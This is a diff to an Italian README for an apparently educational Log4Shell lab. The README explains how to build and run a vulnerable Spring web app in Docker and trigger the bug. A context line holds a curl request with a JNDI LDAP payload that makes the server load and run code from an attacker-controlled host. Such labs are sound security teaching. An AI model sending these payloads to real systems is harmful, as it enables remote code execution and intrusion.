@@ -38,16 +38,25 @@ curl -A '${jndi:ldap://192.168.10.128:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9o
 ```
 Per codificare in base64 il payload ci si può servire del tool disponibile qui: https://gchq.github.io/CyberChef/
 
+Ovviamente il server della WebApp deve essere avviato prima di inviare la richiesta curl.
+
 ## Avvio web-app
+
+Se si desidera utilizzare il container docker (consigliato), si deve prima di tutto clonare questo repo con:
+```bash
+git clone https://github.com/andree93/sicurezza-spring-webapp-log4j.git
+```
+
+Posizionarsi nella directory principale della webApp e creare l'immagine docker con il Dockerfile presente su questo repo:
+```bash
+docker build .
+```
+Avviare il container:
 
 ```bash
 docker run --name nomeApplicazione -p 8080:8080 --network nomeRete
 ```
-
-
-
-
-Successivamente sarà possibile notare dai log del server JNDI che è stata "servita" la classe Java al server della nostra WebApp, con il payload al suo interno.
+Dopo aver inviato la request al server della webApp, come descritto sopra (ad esempio con curl), sarà possibile notare dai log del server JNDI che è stata "servita" la classe Java al server della nostra WebApp, con il payload al suo interno.
 A seconda del comando eseguito, è possibile vedere il risultato. Ad esempio, se il payload provoca la creazione di file, è possibile entrare nel container e verificarlo. Ad esempio:
 
 
